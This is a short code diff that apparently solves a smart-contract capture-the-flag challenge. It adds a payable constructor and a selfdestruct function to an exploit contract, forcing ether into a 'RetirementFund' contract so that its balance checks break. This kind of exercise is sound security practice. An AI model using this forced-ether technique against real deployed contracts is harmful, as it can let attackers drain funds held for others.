@@ -53,9 +53,14 @@ contract RetirementFund {
 contract ExploitContract {
     RetirementFund public retirementFund;
 
-    constructor(RetirementFund _retirementFund) {
+    constructor(RetirementFund _retirementFund) payable {
         retirementFund = _retirementFund;
     }
 
     // write your exploit functions below
+    
+    function selfdestruct_ExploitContract() public {
+        selfdestruct(payable(address(retirementFund)));
+    }
+
 }
